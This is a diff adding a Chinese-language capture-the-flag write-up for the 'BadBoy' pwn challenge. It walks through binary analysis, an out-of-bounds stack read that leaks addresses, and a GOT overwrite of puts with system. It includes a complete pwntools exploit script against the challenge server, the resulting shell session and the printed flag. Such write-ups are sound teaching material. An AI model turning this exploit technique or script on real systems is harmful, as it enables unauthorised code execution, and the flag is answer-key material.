@@ -6292,6 +6292,162 @@ io.interactive()
 
 ------
 
+### BadBoy
+
+题目附件解压缩后得到三个文件：`BadBoy-2`，`ld-linux-x86-64.so.2`，`libc.so.6`。
+
+用`file`查看文件类型，并用`checksec`检查程序保护情况。
+
+```bash
+┌──(ctf)─(t0ur1st㉿kali)-[~/problems/badboy]
+└─$ ls
+BadBoy-2  ld-linux-x86-64.so.2  libc.so.6
+
+┌──(ctf)─(t0ur1st㉿kali)-[~/problems/badboy]
+└─$ sudo chmod +x BadBoy-2                     
+[sudo] password for t0ur1st: 
+
+┌──(ctf)─(t0ur1st㉿kali)-[~/problems/badboy]
+└─$ file ./BadBoy-2       
+./BadBoy-2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fc854062f9e35df604e9737edd1fd1d7d731b725, not stripped
+                                                                   
+┌──(ctf)─(t0ur1st㉿kali)-[~/problems/badboy]
+└─$ checksec --file=./BadBoy-2       
+[*] '/home/t0ur1st/problems/badboy/BadBoy-2'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+```
+
+用`IDA Pro 64bit`打开`BadBoy-2`，按`F5`反汇编源码并查看主函数，发现`welcome()`函数很可疑。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  unsigned __int8 v4; // [rsp+7h] [rbp-19h] BYREF
+  __int64 v5; // [rsp+8h] [rbp-18h] BYREF
+  __int64 buf[2]; // [rsp+10h] [rbp-10h] BYREF
+
+  buf[1] = __readfsqword(0x28u);
+  init_func(argc, argv, envp);
+  buf[0] = 0x67666564636261LL;
+  v5 = 0LL;
+  while ( (_DWORD)kl )
+  {
+    puts("i am bad boy ");
+    __isoc99_scanf("%ld", &v4);
+    write(1, (char *)buf + v4, (unsigned int)kl);
+    LODWORD(kl) = kl - 3;
+  }
+  printf("because i'm not girl ");
+  read(0, buf, 3uLL);
+  printf("so can you fell me? ");
+  __isoc99_scanf("%lld", &v5);
+  if ( v5 > 8 )
+    exit(0);
+  printf("HaHaHa ");
+  read(0, (char *)buf + v5, 3uLL);
+  puts((const char *)buf);
+  return 0;
+}
+```
+
+查看`kl`变量，发现其是初始值为6的全局变量。
+
+```assembly
+.data:0000000000601068                 public kl
+.data:0000000000601068 ; size_t kl
+.data:0000000000601068 kl              dd 6              ; DATA XREF: main+5D↑r
+.data:0000000000601068                                   ; main+88↑r ...
+.data:0000000000601068 _data           ends
+```
+
+`while`循环代码块中，读取`%ld`的数字存储到无符号整型变量`v4`，并使用`write`打印`kl`长度的`buf+v4`的内容，输出完毕后将`kl`值减3。因此`while`循环代码块可以执行两次，第一次只能泄露出6字节的值，第二次可以打印3字节的值。
+
+`buf`地址的偏移量是0x10。
+
+```assembly
+-0000000000000019 var_19          db ?
+-0000000000000018 var_18          dq ?
+-0000000000000010 buf             dq ?
+-0000000000000008 var_8           dq ?
++0000000000000000  s              db 8 dup(?)
++0000000000000008  r              db 8 dup(?)
++0000000000000010
++0000000000000010 ; end of stack variables
+```
+
+以下是泄露的exp：
+
+```python
+io.sendlineafter("i am bad boy \n",str(40))
+stack_addr=u64(io.recv(6).ljust(8,b'\x00'))
+print(hex(stack_addr))
+
+io.sendlineafter("i am bad boy \n",str(24))
+libc_start_call_main = u64(io.recv(3).ljust(8,b'\x00'))
+print("libc_start_call_main"+hex(libc_start_call_main))
+```
+
+`libc`地址其实3个字节就够用了，然后又能往buf地址写3个字节的值，这里我们只能写出`sh/x00`，接着修改`puts_got`的内容，修改成`system`函数，最后调用`puts(buf)`的时候就可以达到`getshell`的目的。
+
+代码中`v5`的值是可以输入负数，我们通过输入负数来实现got表的数据写入，只需要知道`buf`地址以及`puts_got`的地址，而`buf`地址又可以通过泄露的栈地址减去`0xf8`来确定。
+
+首先我们先确定到`libc_start_main`函数的地址，减去`libc_start_main`函数偏移得到后3字节的基地址，再加上`system`的偏移量就是`system`函数后3字节的真实地址。
+
+编写`Python`代码求解：
+
+```python
+from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug')
+filename = './BadBoy-2'
+# io = process(filename)
+io = remote('pwn.challenge.ctf.show', 28151)
+elf = ELF(filename)
+libc = ELF('libc.so.6')
+# gdb.attach(io,"b *0x400987")
+io.sendlineafter('i am bad boy \n',str(40))
+stack_addr = u64(io.recv(6).ljust(8,b'\x00'))
+log.success(hex(stack_addr))
+
+io.sendlineafter('i am bad boy \n',str(24))
+libc_start_call_main = u64(io.recv(3).ljust(8,b'\x00'))
+log.success('libc_start_call_main'+hex(libc_start_call_main))
+
+io.sendlineafter(b"because i'm not girl ",b'sh\x00')
+puts_got_idx = -(stack_addr-0xf8-elf.got['puts'])
+log.success('puts_got_idx'+hex(puts_got_idx))
+
+io.sendlineafter(b'so can you fell me? ',str(puts_got_idx))
+system_addr=libc_start_call_main-0x21c87+libc.sym['system']
+io.sendlineafter(b'HaHaHa ', p64(system_addr))
+io.interactive()
+```
+
+拿到`shell`后输入`ls`查看目录，再用`cat ctfshow_flag`获取`flag`。
+
+```bash
+[*] Switching to interactive mode
+$ ls
+ctfshow_flag
+...
+
+$ cat ctfshow_flag
+[DEBUG] Sent 0x11 bytes:
+    b'cat ctfshow_flag\n'
+[DEBUG] Received 0x2e bytes:
+    b'ctfshow{e3a36b45-80af-428a-8c9c-55e27517570b}\n'
+ctfshow{e3a36b45-80af-428a-8c9c-55e27517570b}
+```
+
+提交`ctfshow{e3a36b45-80af-428a-8c9c-55e27517570b}`即可。
+
+------
+
 ## PwnTheBox
 
 ### [others shellcode](https://ce.pwnthebox.com/challenges?id=476)
